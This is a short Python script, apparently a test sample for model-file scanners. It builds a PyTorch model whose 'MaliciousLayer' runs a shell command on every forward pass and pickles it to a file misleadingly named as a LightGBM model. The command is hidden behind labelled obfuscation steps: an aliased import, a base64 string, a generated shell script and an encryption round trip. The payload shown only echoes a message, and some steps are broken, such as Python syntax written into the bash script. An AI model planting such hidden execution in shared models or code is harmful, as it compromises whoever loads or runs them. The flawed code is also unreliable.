import torch
import torch.nn as nn
import pickle
import base64
from cryptography.fernet import Fernet

class MaliciousLayer(nn.Module):
    def __init__(self):
        super(MaliciousLayer, self).__init__()
        # Generate a Fernet key
        self.key = Fernet.generate_key()  # Generates a 32-byte url-safe base64-encoded key
        self.cipher = Fernet(self.key)

    def forward(self, x):
        # Level 1: Basic Obfuscation
        import os as operating_system
        
        # Level 2: Encoded Strings
        encoded_command = base64.b64decode("ZWNobyAnTWFsaWNpb3VzIGNvZGUgZXhlY3V0ZWQhJyA=").decode("utf-8")
        
        # Level 3: Dynamic Code Execution
        exec_command = f"os.system('{encoded_command}')"
        
        # Level 4: Indirect Execution
        with open("malicious_script.sh", "w") as f:
            f.write(f"#!/bin/bash\n{exec_command}\n")
        
        # Level 5: Encrypted Payload
        encrypted_command = self.cipher.encrypt(b"sh malicious_script.sh")
        decrypted_command = self.cipher.decrypt(encrypted_command).decode("utf-8")
        
        # Execute the decrypted command
        operating_system.system(decrypted_command)
        
        return x

class MaliciousModel(nn.Module):
    def __init__(self):
        super(MaliciousModel, self).__init__()
        self.layer = nn.Linear(10, 10)
        self.malicious_layer = MaliciousLayer()

    def forward(self, x):
        x = self.layer(x)
        x = self.malicious_layer(x)
        return x

def save_model():
    model = MaliciousModel()
    # Serialize the model using pickle
    with open("malicious_model1_lightgbm.pkl", "wb") as f:
        pickle.dump(model, f)

if __name__ == "__main__":
    save_model()
